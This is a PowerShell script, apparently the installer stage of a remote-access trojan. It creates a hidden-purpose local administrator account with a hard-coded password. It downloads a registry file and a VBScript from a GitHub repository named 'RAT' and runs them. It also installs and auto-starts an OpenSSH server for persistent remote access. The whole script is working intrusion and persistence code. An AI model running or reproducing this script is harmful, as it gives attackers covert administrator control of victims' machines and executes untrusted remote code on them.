# Function to generate random text for directory name
function random_text {
    $chars = ([char[]]([char]'A'..[char]'Z') + ([char[]]([char]'a'..[char]'z')))
    $randomChars = Get-Random -InputObject $chars -Count 5
    return -join $randomChars
}



# create local user
function create_account {
    [CmdletBinding()]
    param(
        [string] $NewName,
        [securestring] $Password
    )
    begin{

    }
    process{
        New-LocalUser "$NewName" -Password $Password -FullName "$NewName" -Description "Temporary local admin"
        Write-Verbose "$NewName local user created"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewName"
    }
    end{

    }
}

# Variables
$wd = random_text
$path = Join-Path -Path $env:temp -ChildPath $wd
Write-Output $path

# Create directory if it doesn't exist
if (-not (Test-Path $path)) {
    New-Item -Path $path -ItemType Directory
}

# Change directory
Set-Location $path

# Now you can proceed with your script
Write-Output "" > poc.txt

$NewName = "jarbou3"
$Password = (ConvertTo-SecureString "jarbou3" -AsPlainText -Force)
create_account -NewName $NewName -Password $Password

Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/wreg.reg -OutFile "wreg.reg"

$vbs_file = random_text
Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/hello.vbs -OutFile "hello.vbs"



# enable persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'


./wreg.reg; ./hello


Set-Location C:\Users\user\OneDrive\Bureau\rat\files
